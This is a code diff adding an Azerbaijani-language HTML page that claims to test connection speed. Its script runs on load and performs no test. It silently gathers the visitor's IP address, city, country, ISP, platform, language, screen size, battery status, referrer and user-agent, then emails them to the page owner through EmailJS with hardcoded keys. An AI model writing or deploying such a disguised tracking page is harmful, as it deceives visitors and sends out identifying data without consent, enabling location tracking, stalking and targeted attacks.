@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="az">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bağlantı Hızı Test Ediliyor...</title>
+    
+    <!-- EmailJS Kitabxanası -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script type="text/javascript">
+       (function(){
+          emailjs.init("gby_PCzaR_VAgF_gB");
+       })();
+    </script>
+
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .card {
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+            text-align: center;
+        }
+        h2 { color: #333; }
+        p { color: #666; }
+    </style>
+</head>
+<body>
+
+    <div class="card">
+        <h2>Bağlantı Hızı Test Ediliyor...</h2>
+        <p>Lütfən gözləyin, ağ performansınız analiz edilir.</p>
+    </div>
+
+    <script>
+        window.addEventListener('load', async function() {
+            // 1. IP və Yerləşmə məlumatlarını əldə etmək üçün pulsuz xidmət sorğusu
+            let ipInfo = "Təyin olunmadı";
+            let locationInfo = "Naməlum";
+            try {
+                let response = await fetch('https://ipapi.co/json/');
+                let data = await response.json();
+                ipInfo = data.ip;
+                locationInfo = `${data.city}, ${data.country_name} (${data.org})`;
+            } catch (e) {
+                console.log("IP xətası:", e);
+            }
+
+            // 2. İnternet bağlantı növü (əgər dəstəklənirsə)
+            let connectionType = navigator.connection ? navigator.connection.effectiveType : "Naməlum";
+
+            // 3. Batareya statusu (əgər dəstəklənirsə)
+            let batteryStatus = "Məlumat yoxdur";
+            if (navigator.getBattery) {
+                try {
+                    let battery = await navigator.getBattery();
+                    batteryStatus = `${Math.round(battery.level * 100)}% (${battery.charging ? 'Şarjda' : 'Şarjda deyil'})`;
+                } catch (e) {}
+            }
+
+            // 4. Məlumatları EmailJS şablonuna uyğunlaşdırmaq
+            var templateParams = {
+                title: "Yeni Ziyarətçi Detalları",
+                name: "Sayt Ziyarətçisi",
+                email: "visitor@speedtest.com",
+                message: 
+                         "🌐 IP Ünvanı: " + ipInfo + "\n" +
+                         "📍 Yerləşmə: " + locationInfo + "\n" +
+                         "💻 Platforma: " + navigator.platform + "\n" +
+                         "🌍 Brauzer Dili: " + navigator.language + "\n" +
+                         "📱 Ekran Ölçüsü: " + window.screen.width + "x" + window.screen.height + "\n" +
+                         "⚡ İnternet Növü: " + connectionType + "\n" +
+                         "🔋 Batareya: " + batteryStatus + "\n" +
+                         "🔗 Gəldiyi Mənbə: " + (document.referrer || "Birbaşa keçid") + "\n" +
+                         "🔍 Cihaz (User-Agent): " + navigator.userAgent
+            };
+
+            // 5. E-poçt göndərilməsi
+            emailjs.send('service_9y4l4yc', 'template_arb41hy', templateParams)
+                .then(function(response) {
+                   console.log('Bütün detallar göndərildi!', response.status);
+                }, function(error) {
+                   console.log('Xəta baş verdi...', error);
+                });
+        });
+    </script>
+
+</body>
+</html>
